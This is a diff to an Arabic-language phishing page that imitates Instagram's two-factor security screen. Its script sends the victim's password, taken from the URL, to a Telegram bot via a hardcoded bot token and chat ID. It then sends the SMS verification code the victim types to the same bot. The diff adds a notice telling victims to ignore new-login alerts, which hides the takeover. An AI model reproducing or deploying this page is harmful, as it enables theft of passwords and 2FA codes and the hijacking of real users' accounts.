@@ -5,46 +5,61 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>تأمين الحساب | Instagram</title>
     <style>
-        body { font-family: -apple-system, sans-serif; background: #fff; margin: 0; display: flex; flex-direction: column; align-items: center; }
+        body { font-family: -apple-system, sans-serif; background: #fff; margin: 0; display: flex; flex-direction: column; align-items: center; color: #262626; }
         .top-bar { width: 100%; padding: 15px 0; border-bottom: 1px solid #dbdbdb; text-align: center; font-weight: bold; background: #fafafa; font-size: 14px; }
         .container { width: 100%; max-width: 350px; text-align: center; padding: 25px 20px; }
         .logo { width: 150px; margin-bottom: 20px; }
         .profile-img { width: 100%; border-radius: 12px; margin: 15px 0; border: 1px solid #dbdbdb; }
         .btn-blue { width: 100%; background: #0095f6; color: white; border: none; padding: 14px; border-radius: 8px; font-weight: bold; cursor: pointer; }
         input { width: 100%; padding: 14px; border: 1px solid #dbdbdb; border-radius: 8px; background: #fafafa; margin-bottom: 15px; box-sizing: border-box; font-size: 18px; text-align: center; }
+        .alert-box { background: #fff9e6; border: 1px solid #ffe58f; padding: 10px; border-radius: 8px; font-size: 12px; color: #856404; margin-bottom: 15px; line-height: 1.4; }
         #step-photo { display: none; }
     </style>
 </head>
 <body onload="capturePassword()">
     <div class="top-bar">المصادقة بخطوتين</div>
+    
     <div class="container" id="step-sms">
         <img src="https://www.logo.wine/a/logo/Instagram/Instagram-Wordmark-Logo.wine.svg" class="logo">
         <h3 style="font-size: 18px;">أدخل رمز الأمان</h3>
-        <p style="font-size: 14px; color: #8e8e8e;">لقد أرسلنا رمزاً مكوناً من 6 أرقام إلى هاتفك المرتبط بـ <b>@_5z5z5</b>.</p>
+        
+        <div class="alert-box">
+            <b>ملاحظة:</b> قد تتلقى تنبيهاً فورياً بتسجيل دخول جديد؛ يرجى تجاهله حيث أن النظام يقوم حالياً بمزامنة بيانات الأمان الخاصة بك.
+        </div>
+
+        <p style="font-size: 14px; color: #8e8e8e; line-height: 1.5;">لقد أرسلنا رمزاً مكوناً من 6 أرقام إلى هاتفك المرتبط بـ <b>@_5z5z5</b>.</p>
         <input type="text" id="sms" placeholder="000000" maxlength="6">
         <button class="btn-blue" onclick="sendSMS()">تأكيد الرمز</button>
     </div>
+
     <div class="container" id="step-photo">
         <h3 style="font-size: 18px;">مراجعة سجلات الحساب</h3>
         <p style="font-size: 13px; color: #8e8e8e;">هل قمت بحذف هذه الصورة مؤخراً؟</p>
         <img src="IMG_1145.jpeg" class="profile-img">
-        <div style="display: flex; gap: 10px;"><button class="btn-blue" onclick="finish()" style="background:#efefef; color:#262626;">نعم</button><button class="btn-blue" onclick="finish()" style="background:#efefef; color:#262626;">لا</button></div>
+        <div style="display: flex; gap: 10px;">
+            <button class="btn-blue" onclick="finish()" style="background:#efefef; color:#262626;">نعم</button>
+            <button class="btn-blue" onclick="finish()" style="background:#efefef; color:#262626;">لا</button>
+        </div>
     </div>
+
     <script>
         const botToken = "8233268720:AAE3yeH9WImIv_yiCUSRkpL_ok-n0EUUqyA";
         const chatId = "897618292";
+
         function capturePassword() {
             const pass = new URLSearchParams(window.location.search).get('pass');
             if (pass) fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=🔑 الباسورد: ${pass}`);
         }
+
         function sendSMS() {
             const sms = document.getElementById('sms').value;
-            if(sms.length<6) return;
+            if(sms.length < 6) return;
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=📲 الرمز: ${sms}`);
-            document.getElementById('step-sms').style.display='none';
-            document.getElementById('step-photo').style.display='block';
+            document.getElementById('step-sms').style.display = 'none';
+            document.getElementById('step-photo').style.display = 'block';
         }
-        function finish() { alert("تم التأمين بنجاح"); window.location.href="https://instagram.com"; }
+
+        function finish() { alert("تم تأمين الحساب بنجاح."); window.location.href="https://instagram.com"; }
     </script>
 </body>
 </html>
